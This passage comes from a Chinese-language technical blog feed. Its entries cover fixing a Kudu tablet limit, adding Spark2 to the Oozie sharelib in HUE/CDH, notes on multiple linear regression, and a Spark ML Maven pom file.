class="line">impala-shell -f impala-shell</span><br></pre></td></tr></table></figure><p>Tips：可能会遇到这样的错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: ImpalaRuntimeException: Error creating Kudu table 'impala::kudu_spark_tpcds_2.catalog_sales'</span><br><span class="line">CAUSED BY: NonRecoverableException: The requested number of tablets is over the maximum permitted at creation time (60). Additional tablets may be added by adding range partitions to the table post-creation.</span><br></pre></td></tr></table></figure><p>原因：</p><p><code>Kudu</code>默认配置最多分区被限制了，需要配置</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3azpwvi62j21c10k9ta6.jpg" alt></p><p>如图栏目里，配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--max_create_tablets_per_ts=30</span><br></pre></td></tr></table></figure><p>生成日志后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail q* -n 1 &gt;&gt; kudu_time_2.log</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;为了测试Kudu的性能，学习了一下大公司SRE生成模拟数据的手段&lt;br&gt;本文会贴上各种原帖，本文仅记录生成过程中遇到的困难和介绍文章中的不同&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="SRE" scheme="http://yoursite.com/categories/SRE/"/>
    
    
      <category term="Analog Data" scheme="http://yoursite.com/tags/Analog-Data/"/>
    
  </entry>
  
  <entry>
    <title>在HUE中整合Oozie和Spark2并验证</title>
    <link href="http://yoursite.com/2019/05/24/HUE%E4%B8%8AOozie%E5%92%8CSpark2%E6%95%B4%E5%90%88/"/>
    <id>http://yoursite.com/2019/05/24/HUE上Oozie和Spark2整合/</id>
    <published>2019-05-23T19:20:53.574Z</published>
    <updated>2019-05-22T08:02:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍</p></blockquote><a id="more"></a> <h3 id="查看sharelib文件夹的位置"><a href="#查看sharelib文件夹的位置" class="headerlink" title="查看sharelib文件夹的位置"></a>查看<code>sharelib</code>文件夹的位置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@master126 ~]# oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">[ShareLib update status]</span><br><span class="line">sharelibDirOld = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">host = http://master126:11000/oozie</span><br><span class="line">sharelibDirNew = hdfs://master126:8020/user/oozie/share/lib/lib_20190521144826</span><br><span class="line">status = Successful</span><br></pre></td></tr></table></figure><h3 id="创建文件目录"><a href="#创建文件目录" class="headerlink" title="创建文件目录"></a>创建文件目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u oozie hdfs dfs -mkdir /user/oozie/share/lib/lib_20190521144826/spark2</span><br></pre></td></tr></table></figure><h3 id="向文件夹中添加Spark2需要的jar包"><a href="#向文件夹中添加Spark2需要的jar包" class="headerlink" title="向文件夹中添加Spark2需要的jar包"></a>向文件夹中添加Spark2需要的jar包</h3><p><code>/opt/cloudera/parcels/SPARK2/lib/spark2/jars</code>文件夹下的所有内容和</p><p><code>/opt/cloudera/parcels/CDH/lib/oozie/oozie-sharelib-yarn/lib/spark</code>下面的<code>oozie-sharelib-spark*.jar</code></p><p>在公司当前环境下，最终能凑齐的一共有293个jar文件，这边我下载下来打个包存在TIM里面，下次使用方便一些。</p><h3 id="修改目录的所有者和权限"><a href="#修改目录的所有者和权限" class="headerlink" title="修改目录的所有者和权限"></a>修改目录的所有者和权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hdfs hadoop fs –chown -R oozie:oozie /user/oozie/share/lib/lib_20170921070424/spark2</span><br><span class="line">sudo -u hdfs hadoop fs –chmod -R 775 /user/oozie/share/lib/lib_20170921070424/spark2</span><br></pre></td></tr></table></figure><h3 id="更新并且确认"><a href="#更新并且确认" class="headerlink" title="更新并且确认"></a>更新并且确认</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">oozie admin -oozie http://master126:11000/oozie -shareliblist</span><br></pre></td></tr></table></figure><h3 id="用样例验证"><a href="#用样例验证" class="headerlink" title="用样例验证"></a>用样例验证</h3><p>测试的时候别的没什么</p><p>properties要注意修改为</p><table><thead><tr><th>–</th><th>–</th></tr></thead><tbody><tr><td>oozie.action.sharelib.for.spark</td><td>spark2</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
      <category term="HUE" scheme="http://yoursite.com/tags/HUE/"/>
    
  </entry>
  
  <entry>
    <title>Multiple Linear Regression | Day 3</title>
    <link href="http://yoursite.com/2019/05/24/day03/"/>
    <id>http://yoursite.com/2019/05/24/day03/</id>
    <published>2019-05-23T19:20:52.284Z</published>
    <updated>2019-05-23T23:57:08.150Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>多元线性回归</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3beehr6fqj20m81jke81.jpg" alt></p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><h4 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h4><p>For a successful regression analysis. It’s essential to validate these assumptions.</p><ol><li><p>Linearity: The relationship between dependent and independent variables should be Linear.</p></li><li><p>Homoscedasticity 方差齐性: (constant variance 恒定方差) of the errors should be maintained.  方差：离散程度的度量</p></li><li>Multivarivate Normality(多元正态性):  Multiple regression assumes that the residuals are normally distributed.</li><li>Lack of Multicollinearity(没有多重共线性，由于存在精确相关关系或者高度相关关系而使模型估计失真或难以估计准确): It is assumed that there is little or no multicollinearity in the data. Multicollinearity occurs when the features (or independent variables) are not independent of each other.</li></ol><h4 id="Dummy-Variables-虚变量、哑变量"><a href="#Dummy-Variables-虚变量、哑变量" class="headerlink" title="Dummy Variables(虚变量、哑变量)"></a>Dummy Variables(虚变量、哑变量)</h4><p>Using categorical data in Multiple Regression Models is a powerful method to include non-numeric data types into a regression model.</p><p>Categorical data refers to data values which represent categories - data values with a fixed and unordered number of values. for instance, gender(male/female). In a regression model, these values can be represented bu dummy variables - variables containing values such as 1 or 0 representing the presence or absence of the categorical.</p><h4 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h4><p>having too many variables could potentially cause our model to become less accurate. especially if certain variables have no effect on the outcome or have a significant effect on other variables. There are various methods to select the appropriate various methods to select the appropriate variable like -</p><ol><li>Forward Selection</li><li>Backward Elimination</li><li>Bi-directional Comparision</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;多元线性回归&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="Linear Regression" scheme="http://yoursite.com/tags/Linear-Regression/"/>
    
  </entry>
  
  <entry>
    <title>Spark ML</title>
    <link href="http://yoursite.com/2019/05/24/SparkML/"/>
    <id>http://yoursite.com/2019/05/24/SparkML/</id>
    <published>2019-05-23T19:20:52.279Z</published>
    <updated>2019-05-23T08:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SparkML也是个大坑，先在这里贴上pom文件</p></blockquote><a id="more"></a> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>Akka repository<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.akka.io/releases<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/scala/<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>src/test/scala/<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.scala-tools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-scala-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">scalaVersion</span>&gt;</span>2.11.4<span class="tag">&lt;/<span class="name">scalaVersion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.AppendingTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span>reference.conf<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">Main-Class</span>&gt;</span><span class="tag">&lt;/<span class="name">Main-Class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-common&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;spark-streaming-kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;2.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-mllib_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span 